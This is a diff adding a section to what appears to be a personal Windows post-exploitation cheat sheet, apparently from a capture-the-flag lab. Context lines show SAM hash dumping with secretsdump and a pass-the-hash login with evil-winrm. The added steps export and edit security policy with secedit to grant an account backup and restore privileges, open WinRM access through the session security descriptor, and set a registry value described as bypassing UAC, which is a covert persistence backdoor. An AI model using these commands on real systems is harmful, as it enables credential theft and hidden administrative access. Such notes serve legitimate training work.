@@ -485,8 +485,14 @@ sudo python /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.hiv
 ----------------------------------------------------------
 evil-winrm -i 10.10.233.240 -u Administrator -H f3118544a831e728781d780cfdb9c1fa
 ```
+
 ### Special Privileges and Security Descriptors ✅
-
 ```powershell
-
+0️⃣ secedit /export /cfg config.inf
+1️⃣ We open the file and add our "user" to the lines in the configuration regarding the SeBackupPrivilege and SeRestorePrivilege
+2️⃣ secedit /import /cfg config.inf /db config.sdb
+3️⃣ secedit /configure /db config.sdb /cfg config.inf
+4️⃣ Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI # add user and giving all access then WinRm eaneble for us 
+5️⃣ reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1 # Bypass UAC to activate “Backup Operators”
+6️⃣ Remote 
 ```
